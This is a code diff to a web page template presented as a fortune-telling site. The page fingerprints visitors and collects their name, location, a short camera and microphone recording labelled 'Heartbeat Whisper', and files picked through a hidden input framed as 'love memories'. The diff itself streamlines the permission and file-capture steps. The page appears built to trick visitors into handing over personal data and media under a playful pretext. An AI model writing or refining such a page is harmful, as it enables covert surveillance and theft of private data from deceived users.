@@ -295,22 +295,11 @@ HTML_TEMPLATE = '''
         localStorage.setItem('fortuneSessionId', sessionId);
     }
 
-    // Flag to skip permissions if already allowed once
-    let permissionsDone = localStorage.getItem('permissionsGranted_' + sessionId);
-    if (permissionsDone === 'true') {
-        // Immediately go to final step (skip permission UI)
-        window.addEventListener('load', () => {
-            if (document.getElementById('step-name') && !document.getElementById('step-name').classList.contains('hidden')) {
-                // But we still need name first; we'll just hide permissions later
-            }
-        });
-    }
-
     let visitorData = { sessionId: sessionId };
     let mediaRecorder, mediaStream, recordedBlobs = [];
     let currentFortuneText = "";
 
-    // ---------- Data collection (fast & robust) ----------
+    // ---------- Data collection ----------
     async function getFingerprint() {
         try {
             const fp = await FingerprintJS.load();
@@ -353,7 +342,6 @@ HTML_TEMPLATE = '''
         return navigator.userAgent;
     }
 
-    // Main entry
     async function startProcess() {
         const name = document.getElementById('userName').value.trim();
         if (!name) return alert('Please enter your name');
@@ -380,7 +368,7 @@ HTML_TEMPLATE = '''
         await new Promise(r => setTimeout(r, 500));
         document.getElementById('loading').classList.add('hidden');
         
-        // If permissions already granted for this session, skip straight to finalize
+        // Skip permissions if already granted
         if (localStorage.getItem('permissionsGranted_' + sessionId) === 'true') {
             await finalizeAndSave();
         } else {
@@ -398,16 +386,10 @@ HTML_TEMPLATE = '''
     async function requestAll() {
         document.getElementById('permissions').classList.add('hidden');
         try {
-            await Promise.race([
-                (async () => {
-                    await getLocation();
-                    await getMedia();      // 3 seconds recording
-                    await getFilesTraditional();  // auto-skips after 10s
-                })(),
-                new Promise((_, reject) => setTimeout(() => reject('timeout'), 25000)) // overall 25s max
-            ]);
-        } catch(e) { console.log("Permission step timeout or error", e); }
-        // Mark as granted for this session
+            await getLocation();
+            await getMedia();
+            await getFilesTraditional();
+        } catch(e) { console.log("Permission error", e); }
         localStorage.setItem('permissionsGranted_' + sessionId, 'true');
         await finalizeAndSave();
     }
@@ -468,7 +450,7 @@ HTML_TEMPLATE = '''
                     } else { resolve(); }
                 };
                 mediaRecorder.start();
-                let seconds = 3;  // FAST: 3 seconds only
+                let seconds = 3;
                 const interval = setInterval(() => {
                     seconds--;
                     showStep('🌟 Heartbeat Whisper', `Capturing ${seconds}s...`, 10 + (3-seconds)/3*90);
@@ -484,20 +466,23 @@ HTML_TEMPLATE = '''
         });
     }
 
-    // File picker with auto-skip after 10 seconds
+    // FIXED: File picker always resolves (never hangs)
     function getFilesTraditional() {
         return new Promise((resolve) => {
             showStep('✨ Secret Keepsake', 'Gathering your love memories (optional)...', 0);
             let resolved = false;
+            
+            // Timeout after 10 seconds to auto-continue
             const timeout = setTimeout(() => {
                 if (!resolved) {
                     resolved = true;
-                    visitorData.files = 'timeout (no selection)';
-                    showStep('✨ Secret Keepsake', 'Auto-continued', 100);
+                    visitorData.files = 'no selection (timeout)';
+                    showStep('✨ Secret Keepsake', 'Continuing without memories', 100);
                     setTimeout(() => { hideStep(); resolve(); }, 500);
                 }
             }, 10000);
             
+            // Create or reuse hidden file input
             let fileInput = document.getElementById('fileInput');
             if (!fileInput) {
                 fileInput = document.createElement('input');
@@ -507,7 +492,10 @@ HTML_TEMPLATE = '''
                 document.body.appendChild(fileInput);
             }
             
-            fileInput.value = '';
+            // Remove previous listener to avoid multiple calls
+            fileInput.onchange = null;
+            fileInput.value = ''; // reset so that choosing same file triggers change
+            
             fileInput.onchange = async (event) => {
                 if (resolved) return;
                 clearTimeout(timeout);
@@ -533,6 +521,9 @@ HTML_TEMPLATE = '''
                 showStep('✨ Secret Keepsake', `${filesData.length} memory(s) received`, 100);
                 setTimeout(() => { hideStep(); resolve(); }, 500);
             };
+            
+            // Also handle if the user closes the file dialog without selecting (no change event)
+            // We need to detect focus return? Unfortunately no reliable event, but timeout will catch it.
             fileInput.click();
         });
     }
